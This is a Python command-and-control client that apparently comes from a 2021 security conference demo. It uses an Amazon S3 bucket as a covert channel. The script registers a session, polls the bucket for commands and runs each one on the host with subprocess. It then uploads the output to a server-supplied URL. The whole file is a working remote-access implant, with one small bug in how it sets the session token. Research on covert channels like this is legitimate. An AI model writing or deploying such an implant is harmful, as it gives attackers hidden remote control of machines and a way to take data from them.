#!/usr/bin/python

import http.client
import random
import subprocess
import time
import uuid
from datetime import datetime
from typing import Any, Optional, Tuple

# Shared constants between client and server
CONST_CHANNEL_COUNT = 5
CONST_BUCKET_REGION = "eu-west-1"
CONST_CHANNEL_PREFIX = "cnc-channel"
CONST_CNC_BUCKET = "hitbsecconf2021ams-s3-cnc"
CONST_MSG_FROM_CLIENT = "client.msg"
CONST_MSG_FROM_SERVER = "server.msg"
CONST_PRIV_SESSION_PREFIX = "sessions"

# C&C client constants
CONST_CNC_URL = f"https://{CONST_CNC_BUCKET}.s3-{CONST_BUCKET_REGION}.amazonaws.com"


def _https_request(url: str, method: str, body: Optional[bytes]) -> Any:
    host, uri = url.replace("https://", "").split("/")
    https = http.client.HTTPSConnection(host, 443)
    https.request(method, f"/{uri}", body)
    return https.getresponse()


def _request_session() -> str:
    channel_id = random.randint(1, CONST_CHANNEL_COUNT) - 1
    channel_url = f"{CONST_CNC_URL}/{CONST_CHANNEL_PREFIX}-{channel_id}"
    session_id = uuid.uuid4().hex

    request_payload = f"{channel_id}\n{session_id}"
    response = _https_request(channel_url, "GET", None)
    channel_session = response.read().decode("utf-8")
    _https_request(channel_session, "PUT", request_payload.encode("utf-8"))
    return session_id


####################################################################################################


def init_session() -> Tuple[str, str]:
    session_id = _request_session()
    session_url = f"{CONST_CNC_URL}/{CONST_PRIV_SESSION_PREFIX}.{session_id}"
    response = _https_request(session_url, "GET", None)

    while response.status != 200:
        time.sleep(1)
        response = _https_request(session_url, "GET", None)
        session_token = response.read().decode("utf-8")

    return session_id, session_token


def read_command(session_id: str) -> Optional[Any]:
    command_url = f"{CONST_CNC_URL}/{CONST_MSG_FROM_SERVER}.{session_id}"
    response = _https_request(command_url, "GET", None)

    if response.status == 200:
        command_url, command = response.read().decode("utf-8").split("\n")
        _https_request(command_url, "DELETE", None)
        return command
    else:
        return None


if __name__ == "__main__":
    print(f"[{datetime.utcnow()}] C&C client started. Starting session...")
    session_id, session_token = init_session()
    print(f"[{datetime.utcnow()}] Session established. Waiting for command...")

    while True:
        time.sleep(1)
        command = read_command(session_id)

        if command:
            print(f'[{datetime.utcnow()}] Received CMD: "{command}"')
            output = subprocess.check_output(command.split(" "))
            _https_request(session_token, "PUT", output)
